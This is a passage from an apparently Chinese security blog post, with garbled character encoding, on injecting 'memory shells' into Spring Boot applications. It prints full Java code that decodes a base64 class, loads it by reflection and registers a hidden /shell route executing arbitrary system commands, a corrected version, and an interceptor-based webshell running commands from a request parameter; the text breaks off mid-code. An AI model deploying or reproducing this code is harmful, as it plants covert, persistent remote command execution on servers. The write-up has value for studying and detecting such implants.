æ³¨å…¥å†…å­˜é©¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAjQoAIQBJCABKCwBLAEwLAE0ATggATwgAUAoAUQBSCgAMAFMIAFQKAAwAVQcAVgcAVwgAWAgAWQoACwBaCABbCABcBwBdCgALAF4KAF8AYAoAEgBhCABiCgASAGMKABIAZAoAEgBlCgASAGYKAGcAaAoAZwBpCgBnAGYLAE0AagcAawcAbAcAbQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAVwcAbgcAVgcAXQcAawEAEE1ldGhvZFBhcmFtZXRlcnMBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEABi9zaGVsbAEABm1ldGhvZAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDsBAANHRVQBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQEAOExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVzdENvbnRyb2xsZXI7DAAiACMBAARjb2RlBwBvDABwAHEHAHIMAHMAdAEAAAEAB29zLm5hbWUHAHUMAHYAcQwAdwB4AQADd2luDAB5AHoBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAiAHsBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAfAB9BwB+DAB/AIAMACIAgQEAAlxBDACCAIMMAIQAhQwAhgB4DACHACMHAG4MAIgAiQwAigAjDACLAIwBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5b3JnL2Nsb3duL3NwcmluZ2Jvb3RtZW1vcnlzaGVsbC9jb250b3JsbGVyL1Rlc3RDb250cm9sbGVyAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAlzZW5kRXJyb3IBAAQoSSlWACEAIAAhAAAAAAACAAEAIgAjAAEAJAAAAC8AAQABAAAABSq3AAGxAAAAAgAlAAAABgABAAAADgAmAAAADAABAAAABQAnACgAAAABACkAKgADACQAAAGoAAYACAAAALMrEgK5AAMCAE4suQAEAQA6BC3GAJMSBToFEga4AAe2AAgSCbYACpkAIbsAC1kGvQAMWQMSDVNZBBIOU1kFLVO3AA86BqcAHrsAC1kGvQAMWQMSEFNZBBIRU1kFLVO3AA86BrsAElkZBrYAE7YAFLcAFRIWtgAXOgcZB7YAGJkACxkHtgAZpwAFGQU6BRkHtgAaGQQZBbYAGxkEtgAcGQS2AB2nAAwsEQGUuQAeAgCnAAROsQABAAAArgCxAB8AAwAlAAAASgASAAAAEgAJABMAEQAUABUAFQAZABcAKQAYAEcAGgBiAB0AeAAeAIwAHwCRACAAmAAhAJ0AIgCiACMApQAkAK4AKACxACYAsgApACYAAABcAAkARAADACsALAAGABkAiQAtAC4ABQBiAEAAKwAsAAYAeAAqAC8AMAAHAAkApQAxAC4AAwARAJ0AMgAzAAQAAACzACcAKAAAAAAAswA0ADUAAQAAALMANgA3AAIAOAAAACkACP4ARwcAOQcAOgcAOfwAGgcAO/wAJQcAPEEHADn4ABr5AAhCBwA9AAA+AAAACQIANAAAADYAAAA/AAAAGAABAEAAAgBBWwABcwBCAENbAAFlAEQARQACAEYAAAACAEcAPwAAAAYAAQBIAAA=&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>,d, <span class="hljs-number">0</span>, d.length&#125;);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).newInstance(), mm);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è®¿é—®helloè·¯ç”±çš„æ—¶å€™å°±èƒ½æˆåŠŸæ³¨å…¥å†…å­˜é©¬</p><p>å†å»è®¿é—®shellè·¯ç”±å°±èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤äº†</p><p><img src="https://cdn.clown2024.cn/image-20241113172717161.png" alt="image-20241113172717161"></p><blockquote><p>è¿™é‡Œçš„å®ç°è¦æ±‚æœåŠ¡å™¨ä¸Šå¾—æœ‰ä½ çš„æ¶æ„ç±»ï¼Œä¸ç„¶Class.forNameè¿™é‡Œå°±ä¼šæŠ¥é”™ï¼Œé—®äº†ä¸€ä¸‹kimiä»–ç»™å‡ºçš„ç†ç”±å¦‚ä¸‹ï¼š</p><ol><li><strong>ç±»åŠ è½½æœºåˆ¶</strong>ï¼š<ul><li>Javaçš„ç±»åŠ è½½æœºåˆ¶æ˜¯åŸºäºç±»åŠ è½½å™¨çš„ã€‚æ¯ä¸ªç±»åŠ è½½å™¨éƒ½æœ‰è‡ªå·±çš„ç±»åŠ è½½ç¼“å­˜ã€‚</li><li>å½“ä½ ä½¿ç”¨<code>Class.forName</code>æ—¶ï¼Œå®ƒä¼šå°è¯•ä»å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ï¼ˆ<code>Thread.currentThread().getContextClassLoader()</code>ï¼‰åŠ è½½ç±»ã€‚</li><li>å¦‚æœç±»æ˜¯é€šè¿‡<code>defineClass</code>æ–¹æ³•åŠ¨æ€åˆ›å»ºçš„ï¼Œå®ƒä¸ä¼šè¢«ä»»ä½•ç±»åŠ è½½å™¨çš„ç¼“å­˜ï¼Œå› æ­¤æ— æ³•é€šè¿‡<code>Class.forName</code>æ‰¾åˆ°ã€‚</li></ul></li><li><strong><code>defineClass</code>æ–¹æ³•</strong>ï¼š<ul><li><code>defineClass</code>æ–¹æ³•æ˜¯<code>ClassLoader</code>ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºåŠ¨æ€åˆ›å»ºç±»ã€‚</li><li>é€šè¿‡<code>defineClass</code>åˆ›å»ºçš„ç±»ä¸ä¼šè¢«ç±»åŠ è½½å™¨çš„ç¼“å­˜ï¼Œå› æ­¤æ— æ³•é€šè¿‡å¸¸è§„çš„ç±»åŠ è½½æœºåˆ¶æ‰¾åˆ°ã€‚</li></ul></li></ol></blockquote><p>åæ¥åœ¨kimiçš„å¸®åŠ©ä¸‹æ”¹æˆè¿™æ ·å°±å¯ä»¥äº†ï¼Œå°±ä¸ç”¨Class.forNameï¼Œç›´æ¥è®©ä»–invokeçš„æ—¶å€™å¼ºè½¬æˆClasså°±å¯ä»¥ç”¨äº†</p><p>ä¿®æ”¹åçš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, instance, mm);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Inject Successful!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="interceptorå†…å­˜é©¬"><a href="#Interceptorå†…å­˜é©¬" class="headerlink" title="Interceptorå†…å­˜é©¬"></a>Interceptorå†…å­˜é©¬</h1><p>Interceptoræ˜¯springMvcçš„ç»„ä»¶ï¼Œæ‰€ä»¥ä»–åªä½œç”¨äºSpring MVCçš„è¯·æ±‚å¤„ç†æµç¨‹ï¼Œåªå¤„ç†é€šè¿‡Spring MVCçš„è¯·æ±‚</p><p>æ‰€ä»¥ä»–å’Œå…¶ä»–ç»„ä»¶ä¹Ÿæ˜¯æœ‰åŒºåˆ«çš„ï¼š</p><p><code>Filter</code>å’Œ<code>Listener</code>åœ¨Servletå®¹å™¨ä¸­é…ç½®ï¼Œé€šå¸¸åœ¨<code>web.xml</code>æ–‡ä»¶ä¸­æˆ–é€šè¿‡æ³¨è§£é…ç½®ã€‚</p><p><code>Interceptor</code>åœ¨Spring MVCä¸­é…ç½®ï¼Œé€šå¸¸åœ¨Springçš„é…ç½®æ–‡ä»¶æˆ–é…ç½®ç±»ä¸­ã€‚</p><ul><li><strong>æ‰§è¡Œé¡ºåº</strong>ï¼š<ul><li><code>Filter</code>åœ¨<code>Interceptor</code>ä¹‹å‰æ‰§è¡Œï¼Œå› ä¸º<code>Filter</code>åœ¨è¯·æ±‚åˆ°è¾¾Servletä¹‹å‰å°±å·²ç»æ‰§è¡Œã€‚</li><li><code>Interceptor</code>åœ¨<code>Filter</code>ä¹‹åã€Controllerä¹‹å‰æ‰§è¡Œã€‚</li><li><code>Listener</code>åœ¨åº”ç”¨å¯åŠ¨ã€å…³é—­ã€ä¼šè¯åˆ›å»ºã€é”€æ¯æ—¶æ‰§è¡Œï¼Œä¸è¯·æ±‚å¤„ç†æµç¨‹æ— å…³ã€‚</li></ul></li></ul><p>y4å¸ˆå‚…çš„æ–‡ç« ä¸­æ€»ç»“çš„è¯·æ±‚åˆ°è¾¾Controllerçš„é¡ºåºï¼š</p><p>HttpRequest â€“&gt; Filter â€“&gt; DispactherServlet â€“&gt; Interceptor â€“&gt; Aspect â€“&gt; Controller</p><h2 id="interceptorç¼–å†™"><a href="#Interceptorç¼–å†™" class="headerlink" title="Interceptorç¼–å†™"></a>Interceptorç¼–å†™</h2><p>å…ˆç¼–å†™ä¸€ä¸ªç®€å•çš„interceptorï¼Œå’Œä¸Šé¢çš„controllerä¸€æ ·å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå†è¿›è¡Œæ·»åŠ æ³¨å†Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.configure;<br><br><br><span class="hljs-keyword">import</span> org.clown.springbootmemoryshell.interceptor.TestInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.InterceptorRegistry;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span 